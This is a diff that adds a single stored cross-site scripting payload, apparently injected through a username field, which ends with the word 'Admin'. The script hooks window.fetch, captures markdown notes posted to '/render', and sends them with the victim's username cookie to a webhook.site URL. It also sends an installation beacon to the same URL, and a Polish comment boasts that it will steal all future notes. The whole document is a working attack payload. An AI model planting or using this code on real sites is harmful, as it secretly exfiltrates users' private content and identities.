@@ -1,0 +1,37 @@
+<script>
+(function() {
+    // Monitoring dla przyszłych notatek
+    const originalFetch = window.fetch;
+    window.fetch = function(...args) {
+        if (args[0] === '/render' && args[1]?.method === 'POST') {
+            if (args[1].body instanceof FormData) {
+                const markdown = args[1].body.get('markdown');
+                fetch('https://webhook.site/ea0d9cc5-fd9e-400e-aef7-6add210e23f7', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        type: 'STOLEN_FUTURE_NOTE',
+                        stolen_content: markdown,
+                        victim: document.cookie.match(/username=([^;]+)/)?.[1] || 'unknown',
+                        timestamp: new Date().toISOString(),
+                        attack_vector: 'username_xss_via_recent_users'
+                    })
+                });
+            }
+        }
+        return originalFetch.apply(this, args);
+    };
+
+    // Potwierdzenie instalacji
+    fetch('https://webhook.site/ea0d9cc5-fd9e-400e-aef7-6add210e23f7', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            type: 'XSS_MONITORING_INSTALLED',
+            victim: document.cookie.match(/username=([^;]+)/)?.[1] || 'unknown',
+            timestamp: new Date().toISOString(),
+            message: 'Monitoring active - będę wykradał wszystkie przyszłe notatki'
+        })
+    });
+})();
+</script>Admin
